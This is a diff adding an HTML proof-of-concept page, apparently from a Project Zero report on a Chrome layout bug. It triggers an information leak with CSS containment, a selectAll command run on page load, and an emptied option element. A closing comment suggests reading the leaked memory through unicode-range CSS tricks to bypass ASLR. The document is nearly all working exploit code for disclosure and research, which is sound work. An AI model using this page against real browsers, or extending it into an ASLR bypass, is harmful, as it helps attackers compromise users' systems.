@@ -1,0 +1,29 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1024
+
+Chrome bug:
+
+https://bugs.chromium.org/p/chromium/issues/detail?id=671328
+
+PoC:
+-->
+
+<style>
+content { contain: size layout; }
+</style>
+<script>
+function leak() {
+ document.execCommand("selectAll"); 
+ opt.text = ""; 
+}
+</script>
+<body onload=leak()>
+<content>
+<select>
+<option id="opt">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</option>
+</select>
+</content>
+
+<!--
+Since this is a layout bug AFAIK the leaked data can't be obtained via DOM calls, however it's possible to obtain it using tricks like unicode-range CSS descriptor (credits to Jann Horn for coming up with that approach) which is likely sufficient to turn this into an ASLR bypass.
+-->
